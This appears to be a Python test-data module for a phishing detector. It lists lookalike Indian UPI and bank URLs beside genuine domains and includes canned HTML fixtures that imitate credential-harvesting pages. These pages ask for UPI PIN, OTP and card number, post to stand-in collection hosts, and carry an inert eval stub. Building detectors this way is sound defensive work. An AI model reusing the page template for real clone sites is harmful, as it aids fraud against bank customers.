"""Labelled sample dataset for evaluating the UPI Shield detection pipeline.

OFFLINE & DETERMINISTIC. Every item carries everything the pipeline needs to run
without network: a URL, a source, a gold label ("malicious" | "benign"), optional
shared infrastructure entities (so the campaign demo can cluster), and an optional
canned page fixture ("page") that the evaluator turns into a fetcher.FetchResult so
the visual + behaviour + enrichment stages run with no live fetch.

HOW THE LABELS WERE CHOSEN
--------------------------
Gold labels reflect ground truth that an analyst would assign:

* malicious -> lookalike / impersonation URLs that mimic an Indian UPI or banking
  brand on a non-official registered domain (homoglyphs, lure keywords, raw IP
  hosts, punycode, throwaway TLDs). Where the clone also serves a page, the fixture
  reproduces the credential-harvesting DOM a real kit would ship (UPI PIN / OTP /
  card inputs, cross-domain POST, obfuscated inline JS, reused analytics IDs and
  favicons). These are the pages a takedown would target.

* benign -> the genuine registered domains for the same brands (phonepe.com,
  pay.google.com, onlinesbi.sbi, ...) plus well-known unrelated legitimate sites
  (wikipedia.org, github.com, ...). Their pages, when present, are ordinary
  informational/login pages with no sensitive-credential harvesting and no
  cross-domain form posts. A correct detector must NOT flag these.

The mix (phishing vs benign, with and without page fixtures) is deliberately
balanced so precision and recall are both meaningful rather than trivially high.

ENTITY SHARING FOR THE CAMPAIGN DEMO
------------------------------------
Several malicious items deliberately share infrastructure entities (upi_id,
favicon_hash, ip, phone, analytics_id). ``build_campaigns`` unions them into a
small number of campaigns, demonstrating the infrastructure-graph deliverable.
"""
from __future__ import annotations

from typing import Optional, TypedDict


class Page(TypedDict, total=False):
    """Canned page fixture -> turned into a fetcher.FetchResult by the evaluator."""
    final_url: str
    redirect_chain: list[str]
    status: int
    html: str
    forms: list[dict]
    external_script_srcs: list[str]
    favicon_href: Optional[str]
    favicon_hash: Optional[str]


class Item(TypedDict, total=False):
    url: str
    source: str
    label: str  # "malicious" | "benign"  (gold)
    entities: list[dict]  # optional shared infrastructure entities (type/value)
    page: Page  # optional canned page fixture


# --- Reusable canned phishing pages --------------------------------------------------
# A credential-harvesting UPI clone: UPI PIN + OTP inputs, cross-domain POST, obfuscated
# inline JS, a reused analytics ID (campaign link) and a brand-echoing title/body.
def _phish_page(brand_title: str, body_vocab: str, post_host: str,
                analytics: str = "", favicon_hash: str = "") -> Page:
    analytics_tag = f'<script>var ga="{analytics}";</script>' if analytics else ""
    return Page(
        final_url="",
        status=200,
        html=(
            f"<html><head><title>{brand_title} - Secure Login</title>"
            f"{analytics_tag}"
            "<script>var _0=atob('ZXZpbA==');eval(_0);</script></head>"
            f"<body><h1>{brand_title}</h1>"
            f"<p>{body_vocab} Please verify your account to continue.</p>"
            "<p>Enter your UPI PIN and OTP to complete KYC.</p>"
            f"<form action='https://{post_host}/collect' method='post'>"
            "<input name='upi_pin' type='password' placeholder='Enter UPI PIN'/>"
            "<input name='otp' type='text' placeholder='Enter OTP'/>"
            "<input name='card' type='text' placeholder='Card number'/>"
            "<button type='submit'>Verify</button></form></body></html>"
        ),
        forms=[{
            "action": f"https://{post_host}/collect", "method": "post",
            "inputs": [
                {"name": "upi_pin", "type": "password"},
                {"name": "otp", "type": "text"},
                {"name": "card", "type": "text"},
            ],
        }],
        external_script_srcs=[],
        favicon_href="/favicon.ico",
        favicon_hash=favicon_hash or None,
    )


def _benign_page(brand_title: str, body_vocab: str) -> Page:
    """An ordinary legitimate page: brand text but NO sensitive-credential harvesting,
    NO cross-domain POST, NO obfuscated JS. A correct detector must not flag it."""
    return Page(
        final_url="",
        status=200,
        html=(
            f"<html><head><title>{brand_title}</title></head>"
            f"<body><h1>{brand_title}</h1>"
            f"<p>{body_vocab}</p>"
            "<p>Download our app or learn more about our services.</p>"
            "<form action='/search' method='get'>"
            "<input name='q' type='text' placeholder='Search'/>"
            "<button type='submit'>Go</button></form></body></html>"
        ),
        forms=[{"action": "/search", "method": "get",
                "inputs": [{"name": "q", "type": "text"}]}],
        external_script_srcs=[],
        favicon_href="/favicon.ico",
    )


# Shared infrastructure values used to form campaigns in the demo.
_FAV_A = "fav0phonepe01"      # reused favicon across a PhonePe clone cluster
_UPI_A = "rewards.help@okaxis"  # reused collection handle (PhonePe/Paytm cluster)
_IP_B = "203.0.113.77"        # shared host for an SBI/HDFC cluster
_PHONE_B = "9000012345"       # shared callback number for the SBI/HDFC cluster
_GA_A = "UA-55512345-1"       # reused analytics id (PhonePe cluster)
_GA_B = "G-ABCDE12345"        # reused analytics id (SBI/HDFC cluster)


# =====================================================================================
# MALICIOUS items (gold label "malicious")
# =====================================================================================
_MALICIOUS: list[Item] = [
    # --- PhonePe clone cluster (linked by favicon_hash + upi_id + analytics_id) ---
    {
        "url": "http://phonepe-kyc-verify.xyz/login",
        "source": "ct_log", "label": "malicious",
        "entities": [{"type": "favicon_hash", "value": _FAV_A},
                     {"type": "upi_id", "value": _UPI_A}],
        "page": _phish_page("PhonePe", "PhonePe UPI payment wallet secure money.",
                            "collect-phonepe.xyz", analytics=_GA_A, favicon_hash=_FAV_A),
    },
    {
        "url": "http://ph0nepe-update-reward.top/claim",
        "source": "message", "label": "malicious",
        "entities": [{"type": "favicon_hash", "value": _FAV_A},
                     {"type": "upi_id", "value": _UPI_A}],
        "page": _phish_page("PhonePe", "PhonePe UPI cashback reward wallet.",
                            "collect-phonepe.xyz", analytics=_GA_A, favicon_hash=_FAV_A),
    },
    {
        # Weak URL on its own (brand-in-unofficial-domain only, score ~0.5 ->
        # "suspicious"); only the harvesting page + reused analytics push it over the
        # malicious cutoff. Demonstrates visual/behaviour recall uplift.
        "url": "http://phonepe.secure-portal.in/offer",
        "source": "feed", "label": "malicious",
        "entities": [{"type": "upi_id", "value": _UPI_A}],
        "page": _phish_page("PhonePe", "PhonePe payment cashback secure.",
                            "pay-collect.in", analytics=_GA_A),
    },
    # --- Paytm clones (one links to the PhonePe cluster via the shared UPI id) ---
    {
        "url": "http://paytm-cashback-claim.xyz/win",
        "source": "message", "label": "malicious",
        "entities": [{"type": "upi_id", "value": _UPI_A}],
        "page": _phish_page("Paytm", "Paytm wallet UPI recharge cashback.",
                            "paytm-collect.xyz"),
    },
    {
        # Weak URL (brand-in-unofficial-domain only, "suspicious"); the credential-
        # harvesting page is what makes it malicious at the full stage.
        "url": "http://paytmbusiness.co/verify",
        "source": "ct_log", "label": "malicious",
        "page": _phish_page("Paytm", "Paytm wallet payment KYC update secure.",
                            "paytm-collect.co"),
    },
    # --- SBI / HDFC bank cluster (linked by ip + phone + analytics_id) ---
    {
        "url": "http://sbi-yono-secure-login.live/net",
        "source": "ct_log", "label": "malicious",
        "entities": [{"type": "ip", "value": _IP_B},
                     {"type": "phone", "value": _PHONE_B}],
        "page": _phish_page("SBI", "State Bank of India netbanking login account.",
                            "sbi-collect.live", analytics=_GA_B),
    },
    {
        "url": "http://sbi-kyc-update.top/reactivate",
        "source": "message", "label": "malicious",
        "entities": [{"type": "ip", "value": _IP_B},
                     {"type": "phone", "value": _PHONE_B}],
        "page": _phish_page("SBI", "State Bank India login account secure netbanking.",
                            "sbi-collect.live", analytics=_GA_B),
    },
    {
        "url": "http://hdfc-netbanking-blocked.site/unlock",
        "source": "ct_log", "label": "malicious",
        "entities": [{"type": "ip", "value": _IP_B}],
        "page": _phish_page("HDFC", "HDFC Bank netbanking login account customer.",
                            "hdfc-collect.site", analytics=_GA_B),
    },
    # --- Assorted independent clones (various evasion tactics) ---
    {
        "url": "http://icici-bank-verify-kyc.online/secure",
        "source": "feed", "label": "malicious",
        "page": _phish_page("ICICI", "ICICI Bank netbanking login account secure.",
                            "icici-collect.online"),
    },
    {
        "url": "http://axisbank-reward-claim.buzz/get",
        "source": "message", "label": "malicious",
        "page": _phish_page("Axis", "Axis Bank netbanking login reward secure.",
                            "axis-collect.buzz"),
    },
    {
        "url": "http://gpay-refund-center-verify.icu/refund",
        "source": "feed", "label": "malicious",
        "page": _phish_page("Google Pay", "Google Pay gpay UPI refund payment secure.",
                            "gpay-collect.icu"),
    },
    {
        "url": "http://bhim-upi-reward-claim.cfd/win",
        "source": "message", "label": "malicious",
        "page": _phish_page("BHIM UPI", "BHIM UPI NPCI payment vpa reward.",
                            "bhim-collect.cfd"),
    },
    # Raw-IP host serving a PhonePe clone: the URL is suspicious (ip_host) but only
    # the harvesting page tips it to malicious at the full stage.
    {
        "url": "http://185.199.110.153/phonepe/kyc-verify",
        "source": "ct_log", "label": "malicious",
        "page": _phish_page("PhonePe", "PhonePe UPI payment secure wallet.",
                            "collect-phonepe.xyz", favicon_hash=_FAV_A),
    },
    # Punycode / IDN homograph serving a Paytm clone: punycode signal + harvesting
    # page combine to malicious at the full stage.
    {
        "url": "http://xn--ptm-kyc-verify-9db.xyz/login",
        "source": "feed", "label": "malicious",
        "page": _phish_page("Paytm", "Paytm wallet UPI payment KYC secure.",
                            "paytm-collect.xyz"),
    },
    # Many-hyphen throwaway with lure words, phonepe lookalike.
    {
        "url": "http://secure-phonepe-kyc-update-now.top/verify",
        "source": "message", "label": "malicious",
    },
    # Homoglyph sbi with lure keyword.
    {
        "url": "http://5bi-netbanking-login-secure.site/account",
        "source": "ct_log", "label": "malicious",
    },
]


# =====================================================================================
# BENIGN items (gold label "benign")
# =====================================================================================
_BENIGN: list[Item] = [
    # Genuine brand domains (optionally with ordinary pages).
    {
        "url": "https://www.phonepe.com/", "source": "feed", "label": "benign",
        "page": _benign_page("PhonePe", "PhonePe UPI payments app for India."),
    },
    {
        "url": "https://pay.google.com/", "source": "feed", "label": "benign",
        "page": _benign_page("Google Pay", "Google Pay secure payments."),
    },
    {
        "url": "https://paytm.com/", "source": "feed", "label": "benign",
        "page": _benign_page("Paytm", "Paytm wallet, recharge and payments."),
    },
    {
        "url": "https://www.onlinesbi.sbi/", "source": "feed", "label": "benign",
        "page": _benign_page("State Bank of India", "SBI netbanking and account services."),
    },
    {
        "url": "https://www.hdfcbank.com/", "source": "feed", "label": "benign",
        "page": _benign_page("HDFC Bank", "HDFC Bank netbanking and accounts."),
    },
    {
        "url": "https://www.icicibank.com/", "source": "feed", "label": "benign",
        "page": _benign_page("ICICI Bank", "ICICI Bank netbanking and accounts."),
    },
    {"url": "https://www.axisbank.com/", "source": "feed", "label": "benign"},
    {"url": "https://www.npci.org.in/", "source": "feed", "label": "benign"},
    {"url": "https://www.bhimupi.org.in/", "source": "feed", "label": "benign"},
    {"url": "https://sbi.co.in/", "source": "feed", "label": "benign"},
    # Well-known unrelated legitimate sites.
    {
        "url": "https://en.wikipedia.org/wiki/Payment", "source": "feed", "label": "benign",
        "page": _benign_page("Payment - Wikipedia", "A payment is the transfer of money."),
    },
    {"url": "https://github.com/", "source": "feed", "label": "benign"},
    {"url": "https://www.rbi.org.in/", "source": "feed", "label": "benign"},
    {"url": "https://www.google.com/", "source": "feed", "label": "benign"},
    {"url": "https://news.ycombinator.com/", "source": "feed", "label": "benign"},
]


def all_items() -> list[Item]:
    """Return the full labelled sample (malicious first, then benign)."""
    return [*_MALICIOUS, *_BENIGN]


def phishing_items() -> list[Item]:
    """Return only the gold-malicious items (used by the campaign demo)."""
    return list(_MALICIOUS)


# Prediction threshold documented once and reused by the evaluator: an item is
# predicted "malicious" when the stage's verdict is "malicious" (score >= 0.70),
# matching url_features.verdict_for. 0.70 is the product's malicious cutoff.
MALICIOUS_SCORE_THRESHOLD = 0.70
